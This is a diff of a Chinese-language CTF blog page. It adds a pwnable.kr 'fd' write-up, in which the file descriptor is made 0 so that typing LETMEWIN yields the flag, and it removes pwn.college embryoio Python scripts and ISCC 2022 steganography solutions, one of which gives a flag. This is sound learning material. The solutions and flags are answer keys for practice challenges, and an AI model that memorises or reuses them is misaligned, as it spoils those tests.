+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="R3ape1">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="230">
+      <meta itemprop="description" content="青年们要充分认识自己所负的重任">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | 230">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2022/07/12/fd(wp)/" class="post-title-link" itemprop="url">fd</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2022-07-12 19:41:00 / 修改时间：19:43:16" itemprop="dateCreated datePublished" datetime="2022-07-12T19:41:00+08:00">2022-07-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">刷题</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%88%B7%E9%A2%98/pwnable%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">pwnable刷题</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><p>关于read函数的一道程序题</p>
+<h2 id="保护措施"><a href="#保护措施" class="headerlink" title="保护措施"></a>保护措施</h2><p>![屏幕截图 2022-05-09 212129](&#x2F;屏幕截图 2022-05-09 212129.png)</p>
+<p>远程服务器好像不给我们访问flag的权限</p>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p><code>fd.c</code>的源码如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>* envp[])</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;pass argv[1] a number\n&quot;</span>);		<span class="comment">//参数必须大于2</span></span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;				<span class="comment">//fd的值等于程序运行带传的参数与0x1234的差</span></span><br><span class="line">        <span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">        len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;					<span class="comment">//strcmp将“LETMEWIN\n”与buf比较</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);				<span class="comment">//打印输出flag</span></span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;learn about Linux file IO\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>tips：关于<code>argv[]</code>是一个外部参数，这个参数需要我们在运行程序时就顺带传进去，一般<code>agrv[0] = ./&lt;程序名&gt;</code> ，<code>agrv[1]</code>开始就是我们后续带的值。</p>
+<p><strong>思路：既然<code>fd</code>等于外部参数与<code>0x1234</code>的差，所以<code>fd</code>这个参数对我们来说是可控的，既然<code>fd</code>可控，<code>read</code>函数就可控，我们可以让<code>fd</code>等于0，这样<code>read</code>函数就是从输入流里取32字节写到<code>buf</code>中，这样我们就可以键盘输入“LETMEWIN”，让程序执行<code>system系统调用</code></strong></p>
+<h2 id="程序利用流程"><a href="#程序利用流程" class="headerlink" title="程序利用流程"></a>程序利用流程</h2><ul>
+<li><code>./fd 4660</code>运行程序</li>
+<li>键盘输入对应字符串</li>
+<li>得到flag</li>
+</ul>
+<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">./fd 4660	<span class="comment">#回车</span></span></span><br><span class="line">LETMEWIN	#回车</span><br></pre></td></tr></table></figure>
+
+
+
+<p>![屏幕截图 2022-05-09 214126](&#x2F;屏幕截图 2022-05-09 214126.png)</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -735,9 +1318,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2022-06-22 21:33:11 / 修改时间：21:33:25" itemprop="dateCreated datePublished" datetime="2022-06-22T21:33:11+08:00">2022-06-22</time>
+      <time title="创建时间：2022-06-22 21:33:11" itemprop="dateCreated datePublished" datetime="2022-06-22T21:33:11+08:00">2022-06-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2022-07-12 19:41:03" itemprop="dateModified" datetime="2022-07-12T19:41:03+08:00">2022-07-12</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -749,7 +1338,7 @@
         </span>
           ，
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%88%B7%E9%A2%98/pwncollege%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">pwncollege刷题日记</span></a>
+          <a href="/categories/%E5%88%B7%E9%A2%98/pwncollege%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">pwncollege刷题</span></a>
         </span>
     </span>
 
@@ -778,492 +1367,6 @@
 
 
 
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/22/embryoio%20level15~level28/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/head.png">
-      <meta itemprop="name" content="R3ape1">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="230">
-      <meta itemprop="description" content="青年们要充分认识自己所负的重任">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 230">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/06/22/embryoio%20level15~level28/" class="post-title-link" itemprop="url">embryoio level15~level28</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-06-22 21:31:11 / 修改时间：21:31:33" itemprop="dateCreated datePublished" datetime="2022-06-22T21:31:11+08:00">2022-06-22</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%88%B7%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">刷题</span></a>
-        </span>
-          ，
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E5%88%B7%E9%A2%98/pwncollege%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">pwncollege刷题日记</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="embryoio-level15-level21"><a href="#embryoio-level15-level21" class="headerlink" title="embryoio level15~level21"></a>embryoio level15~level21</h1><h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><p>学会编写python脚本运行程序</p>
-<h2 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h2><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><img src="/2022/06/22/embryoio%20level15~level28/image-20220622150316738.png" class="" title="image-20220622150316738">
-
-<p>根据上图可以知道程序需要一个名叫<code>ipython</code>的python脚本来运行程序，我尝试过在<code>challenge目录</code>下编写脚本但是权限不允许，所以就在用户根目录下创建<code>ipython.py</code>文件。</p>
-<h3 id="编写python脚本"><a href="#编写python脚本" class="headerlink" title="编写python脚本"></a>编写python脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#=====================level15=====================</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.run([<span class="string">&quot;/challenge/embryoio_level15&quot;</span>])</span><br></pre></td></tr></table></figure>
-
-<p>运行后得到flag</p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>其它题目的解题方法与之前的题目都大致一样，无非就是让python脚本来完成之前的操作，所以在此不过多赘述，直接放python代码。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#=====================level16=====================</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.run([<span class="string">&quot;/challenge/embryoio_level16&quot;</span>])		<span class="comment">#运行脚本后输入密码即可获得flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================level17=====================</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.run([<span class="string">&quot;/challenge/embryoio_level16&quot;</span>， <span class="string">&quot;password&quot;</span>])		<span class="comment">#在password替换为需要外部输入的密码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================level18=====================</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.run([<span class="string">&quot;/challenge/embryoio_level18&quot;</span>],env=&#123;<span class="string">&#x27;environment&#x27;</span>:<span class="string">&#x27;value&#x27;</span>&#125;)		<span class="comment">#替换未对应的环境变量即可</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================level19=====================</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/tmp/filename&quot;</span>, <span class="string">&#x27;w&#x27;</span>)		<span class="comment">#fliename替换为对应的外部文件的文件名</span></span><br><span class="line">file.write(<span class="string">&#x27;password&#x27;</span>)					<span class="comment">#password替换为题目对应需要的密码</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/tmp/filename&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">subprocess.run([<span class="string">&#x27;/challenge/embryoio_level19&#x27;</span>], stdin=file)</span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================level20=====================</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/tmp/filename&quot;</span>, <span class="string">&#x27;w&#x27;</span>)		<span class="comment">#fliename替换为对应的外部文件的文件名</span></span><br><span class="line">subprocess.run([<span class="string">&#x27;/challenge/embryoio_level20&#x27;</span>], stdout=file)</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/tmp/filename&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(file.read())</span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================level21=====================</span></span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.run([<span class="string">&quot;/challenge/embryoio_level21&quot;</span>],env=&#123;&#125;)		<span class="comment">#设置一个空环境变量</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h1 id="embryoio-level22-level28"><a href="#embryoio-level22-level28" class="headerlink" title="embryoio level22~level28"></a>embryoio level22~level28</h1><p>这些题与上面一样，基本没什么区别，所以在此也不多赘述，可以参考以上的脚本。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/19/ISCC%202022%202022%E5%86%AC%E5%A5%A5%E4%BC%9A/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/head.png">
-      <meta itemprop="name" content="R3ape1">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="230">
-      <meta itemprop="description" content="青年们要充分认识自己所负的重任">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 230">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/06/19/ISCC%202022%202022%E5%86%AC%E5%A5%A5%E4%BC%9A/" class="post-title-link" itemprop="url">ISCC 2022 2022冬奥会</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-06-19 22:19:11 / 修改时间：22:31:49" itemprop="dateCreated datePublished" datetime="2022-06-19T22:19:11+08:00">2022-06-19</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">比赛</span></a>
-        </span>
-          ，
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%AF%94%E8%B5%9B/2022ISCC/" itemprop="url" rel="index"><span itemprop="name">2022ISCC</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <img src="/2022/06/19/ISCC%202022%202022%E5%86%AC%E5%A5%A5%E4%BC%9A/wps1.jpg" class="" title="img">
-
-<p>下载附件，得到一个带密码的压缩包和一张图片。首先先拖入winhex判断出不是伪加密，爆破也没有出结果。去看图片，发现图片十分干净。这时候想起了题目有hint</p>
-<img src="/2022/06/19/ISCC%202022%202022%E5%86%AC%E5%A5%A5%E4%BC%9A/wps2.jpg" class="" title="img"> 
-
-<p>既然这么说了，那么查阅资料，发现另一只雪容融是以灯笼为原型的，那么就尝试密码为”灯笼”</p>
-<p>（要使用winrar），打开了压缩包。</p>
-<p>将flag.jpg放入winhex中得到flag</p>
-<img src="/2022/06/19/ISCC%202022%202022%E5%86%AC%E5%A5%A5%E4%BC%9A/wps3.jpg" class="" title="img"> 
-
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/19/ISCC%202022%20MISC1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/head.png">
-      <meta itemprop="name" content="R3ape1">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="230">
-      <meta itemprop="description" content="青年们要充分认识自己所负的重任">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 230">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/06/19/ISCC%202022%20MISC1/" class="post-title-link" itemprop="url">ISCC 2022 MISC1</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-06-19 22:19:11 / 修改时间：22:32:53" itemprop="dateCreated datePublished" datetime="2022-06-19T22:19:11+08:00">2022-06-19</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">比赛</span></a>
-        </span>
-          ，
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%AF%94%E8%B5%9B/2022ISCC/" itemprop="url" rel="index"><span itemprop="name">2022ISCC</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>首先下载附件解压缩</p>
-<img src="/2022/06/19/ISCC%202022%20MISC1/wps1.jpg" class="" title="img"> 
-
-<p>发现是苏翊鸣的照片，这里看到了照片的一部分，可以猜到是照片的长度被修改了，拖入winhex</p>
-<img src="/2022/06/19/ISCC%202022%20MISC1/wps2.jpg" class="" title="img"> 
-
-<p>将长度这的16进制数值修改为4，得到如下图片</p>
-<img src="/2022/06/19/ISCC%202022%20MISC1/wps3.jpg" class="" title="img"> 
-
-<p>扫描二维码</p>
-<img src="/2022/06/19/ISCC%202022%20MISC1/wps4.jpg" class="" title="img"> 
-
-<p>得到了一串unicode编码，进行在线解码</p>
-<p><a target="_blank" rel="noopener" href="https://c.runoob.com/front-end/3602/">https://c.runoob.com/front-end/3602/</a></p>
-<p>点击unicode转中文</p>
-<img src="/2022/06/19/ISCC%202022%20MISC1/wps5.jpg" class="" title="img"> 
-
-<p>由于附件中另一个压缩包需要密码，那就猜测这里的描述很可能是压缩包密码，查阅资料应该是15 9 4 2，作为压缩包的密码，可以解得答案</p>
-<img src="/2022/06/19/ISCC%202022%20MISC1/wps6.jpg" class="" title="img"> 
-
-<p>ISCC{beij-dbxj-2013}</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/19/ISCC%202022%20MISC2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/head.png">
-      <meta itemprop="name" content="R3ape1">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="230">
-      <meta itemprop="description" content="青年们要充分认识自己所负的重任">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 230">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/06/19/ISCC%202022%20MISC2/" class="post-title-link" itemprop="url">ISCC 2022 MISC2</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-06-19 22:19:11 / 修改时间：22:33:03" itemprop="dateCreated datePublished" datetime="2022-06-19T22:19:11+08:00">2022-06-19</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">比赛</span></a>
-        </span>
-          ，
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%AF%94%E8%B5%9B/2022ISCC/" itemprop="url" rel="index"><span itemprop="name">2022ISCC</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>打开压缩包，里面有一张图片</p>
-<img src="/2022/06/19/ISCC%202022%20MISC2/wps7.jpg" class="" title="img"> 
-
-<p>是一张魔女的图片，放入kali中foremost分离，分离出了另一张图片</p>
-<img src="/2022/06/19/ISCC%202022%20MISC2/wps8.jpg" class="" title="img"> 
-
-<p>对这张图片进行zsteg的操作，首先zsteg -a查看lsb的各项数据</p>
-<img src="/2022/06/19/ISCC%202022%20MISC2/wps9.jpg" class="" title="img"> 
-
-<p>在这里发现了点东西，接着就是使用zsteg -E了</p>
-<p>zsteg -E b1,r,lsb,yx 该图片名称.png &gt; out.png</p>
-<p>得到out.png</p>
-<p>根据刚下载下来的时候的魔女图片想到这应该是魔女之旅的字体</p>
-<img src="/2022/06/19/ISCC%202022%20MISC2/wps10.jpg" class="" title="img"> 
-
-<img src="/2022/06/19/ISCC%202022%20MISC2/wps11.jpg" class="" title="img"> 
-
-<p>根据out.png上面的字对应上方两张图片的字体，按照题目的要求变成ISCC{xxxx-xxxx-xxxx}的格式（需要全部大写）就是答案了</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/19/ISCC%202022%20MISC3/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/head.png">
-      <meta itemprop="name" content="R3ape1">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="230">
-      <meta itemprop="description" content="青年们要充分认识自己所负的重任">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 230">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/06/19/ISCC%202022%20MISC3/" class="post-title-link" itemprop="url">ISCC 2022 MISC3</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2022-06-19 22:19:11 / 修改时间：22:33:11" itemprop="dateCreated datePublished" datetime="2022-06-19T22:19:11+08:00">2022-06-19</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">比赛</span></a>
-        </span>
-          ，
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%AF%94%E8%B5%9B/2022ISCC/" itemprop="url" rel="index"><span itemprop="name">2022ISCC</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>下载附件，根据题目要求用winrar打开</p>
-<img src="/2022/06/19/ISCC%202022%20MISC3/wps12.jpg" class="" title="img"> 
-
-<p>poem.txt中的内容是五行星星</p>
-<img src="/2022/06/19/ISCC%202022%20MISC3/wps13.jpg" class="" title="img"> 
-
-<p>看了下压缩包，发现需要密码，看来是另两个文件中寻找了，用ps打开psd文件</p>
-<p>隐约能发现一个五角星，进行修整，使五角星更加清晰</p>
-<img src="/2022/06/19/ISCC%202022%20MISC3/wps14.png" class="" title="img"> 
-
-<p>发现了顺序1 3 5 2 4，刚开始以为是poem.txt中的星星排序好再进行转换当做密码，但尝试了好多遍发现都不是，这个时候winrar就起作用了，因为winrar是可以解压带中文密码的文件的，而星星正是中文，因此想太多了。排序好的星星就是压缩包密码。</p>
-<p>解压出来的excel文件有各个星星对应的字母，再按照12345的顺序对应写出字母就是答案了。</p>
 
       
     </div>
